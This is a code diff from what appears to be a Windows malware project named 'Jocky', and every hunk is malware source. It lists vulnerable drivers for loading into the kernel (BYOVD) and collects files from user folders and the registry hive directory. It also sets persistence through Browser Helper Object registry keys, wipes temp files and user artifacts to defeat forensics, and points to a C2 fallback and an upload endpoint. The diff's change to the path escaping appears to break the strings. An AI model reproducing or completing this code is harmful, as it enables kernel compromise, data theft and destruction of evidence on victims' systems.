@@ -447,30 +447,30 @@ const C2_FALLBACK = "http://127.0.0.1:8443/api/config"
 const CDN_ENDPOINT = "http://localhost:9000/upload"
 const MODEL_REPO = "http://localhost:9000/models"
 const MODEL_FILE = "phi-3-mini-4k-instruct.gguf"
-const LOCAL_MODEL_PATH = "C:\\Windows\\Temp\\.jocky_model"
+const LOCAL_MODEL_PATH = "C:\\\\Windows\\\\Temp\\\\.jocky_model"
 const BUILD_ID = "JOCKY_WINDOWS_PRODUCTION_V4_FULL"
 
 // ===== BYOVD DRIVERS (9 VERIFIED) =====
 const DRIVERS = [
-    ("rtkiow10x64.sys", "\\\\.\\RTCore64"),
-    ("rtkiow8x64.sys", "\\\\.\\RTCore64"),
-    ("AMDRyzenMasterDriver.sys", "\\\\.\\AMDRyzenMasterDriver"),
-    ("nvflsh64.sys", "\\\\.\\nvflsh64"),
-    ("speedfan.sys", "\\\\.\\speedfan"),
-    ("ene.sys", "\\\\.\\EneIo"),
-    ("iQVW64.SYS", "\\\\.\\Nal"),
-    ("UCOREW64.SYS", "\\\\.\\Global\\"),
-    ("NTIOLib.sys", "\\\\.\\NTIOLib"),
+    ("rtkiow10x64.sys", "\\\\\\\\.\\\\RTCore64"),
+    ("rtkiow8x64.sys", "\\\\\\\\.\\\\RTCore64"),
+    ("AMDRyzenMasterDriver.sys", "\\\\\\\\.\\\\AMDRyzenMasterDriver"),
+    ("nvflsh64.sys", "\\\\\\\\.\\\\nvflsh64"),
+    ("speedfan.sys", "\\\\\\\\.\\\\speedfan"),
+    ("ene.sys", "\\\\\\\\.\\\\EneIo"),
+    ("iQVW64.SYS", "\\\\\\\\.\\\\Nal"),
+    ("UCOREW64.SYS", "\\\\\\\\.\\\\Global\\\\"),
+    ("NTIOLib.sys", "\\\\\\\\.\\\\NTIOLib"),
 ]
 
 // ===== DATA TARGETS =====
 const DATA_PATHS = [
-    "C:\\Users\\Public\\Downloads",
-    "C:\\Users\\Public\\Documents",
-    "C:\\Users\\Public\\Desktop",
-    "C:\\ProgramData",
-    "C:\\Windows\\System32\\config",
-    "C:\\Program Files",
+    "C:\\\\Users\\\\Public\\\\Downloads",
+    "C:\\\\Users\\\\Public\\\\Documents",
+    "C:\\\\Users\\\\Public\\\\Desktop",
+    "C:\\\\ProgramData",
+    "C:\\\\Windows\\\\System32\\\\config",
+    "C:\\\\Program Files",
 ]
 
 // ===== GLOBAL STATE =====
@@ -636,21 +636,21 @@ fn phase_collect_data() -> bool {
     println("[*] Phase 4: Data Collection (6 Sources)")
 
     // Downloads
-    let downloads = fs_list_files("C:\\Users\\Public\\Downloads", true)
+    let downloads = fs_list_files("C:\\\\Users\\\\Public\\\\Downloads", true)
     if strlen(downloads) > 0 {
         collected_data = jocky_str_concat(collected_data, downloads)
         println("    [+] Downloads: " + string(strlen(downloads)) + " bytes")
     }
 
     // Documents
-    let docs = fs_list_files("C:\\Users\\Public\\Documents", true)
+    let docs = fs_list_files("C:\\\\Users\\\\Public\\\\Documents", true)
     if strlen(docs) > 0 {
         collected_data = jocky_str_concat(collected_data, docs)
         println("    [+] Documents: " + string(strlen(docs)) + " bytes")
     }
 
     // Desktop
-    let desktop = fs_list_files("C:\\Users\\Public\\Desktop", true)
+    let desktop = fs_list_files("C:\\\\Users\\\\Public\\\\Desktop", true)
     if strlen(desktop) > 0 {
         collected_data = jocky_str_concat(collected_data, desktop)
         println("    [+] Desktop: " + string(strlen(desktop)) + " bytes")
@@ -750,7 +750,7 @@ fn phase_kernel_exploit() -> bool {
         // For now, using workaround with direct iteration
         let ctx = jocky_byovd_new()
         // Simplified: just try to load drivers
-        if jocky_byovd_load("rtkiow10x64.sys", "\\\\.\\RTCore64", ctx) {
+        if jocky_byovd_load("rtkiow10x64.sys", "\\\\\\\\.\\\\RTCore64", ctx) {
             println("    [+] BYOVD driver loaded - kernel access obtained")
             kernel_access = true
             jocky_byovd_destroy(ctx)
@@ -791,7 +791,7 @@ fn phase_persistence() -> bool {
     }
 
     // Browser Extension
-    jocky_registry_create_key(0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects", "")
+    jocky_registry_create_key(0x80000001, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Browser Helper Objects", "")
     println("    [+] Browser extension persistence installed")
 
     persistence_set = true
@@ -923,7 +923,7 @@ fn phase_anti_forensics() -> bool {
     }
 
     // Temp Files
-    if jocky_wipe_temp_files("C:\\Windows\\Temp", "C:\\Temp") {
+    if jocky_wipe_temp_files("C:\\\\Windows\\\\Temp", "C:\\\\Temp") {
         println("    [+] Temp files wiped")
     }
 
@@ -937,7 +937,7 @@ fn phase_anti_forensics() -> bool {
     }
 
     // Artifacts
-    jocky_wipe_artifacts("C:\\Users")
+    jocky_wipe_artifacts("C:\\\\Users")
     println("    [+] User artifacts wiped")
 
     println("[+] Anti-forensics complete: 18 cleanup techniques deployed")
